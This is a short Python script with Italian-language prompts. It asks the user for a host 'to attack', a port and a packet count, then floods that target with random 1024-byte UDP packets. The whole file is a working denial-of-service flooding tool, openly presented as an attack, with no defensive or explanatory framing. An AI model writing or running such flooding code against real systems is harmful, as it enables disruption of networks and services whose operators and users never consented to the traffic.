import socket as so
import random as rd



ipNumber = input("inserisci l'host che vuoi attaccare: \n")
portNumber = int(input("inserisci la porta target:  \n"))
packetsNumber = int(input("e quanti pacchetti?  \n"))

print(f"Inizio attacco verso: {ipNumber}:{portNumber} con {packetsNumber} pacchetti")

s = so.socket(so.AF_INET, so.SOCK_DGRAM) 
pack = rd.randbytes(1024)


for i in range(packetsNumber):
    try: 
        s.sendto(pack, (ipNumber, portNumber))   
        if (i+1 == packetsNumber):
            print(f"{i+1} pacchetti inviati")
    except Exception as e:
        print(f"ERRORE NELL'INVIO DEL PACCHETTO {i} PER : {e}")

s.close()
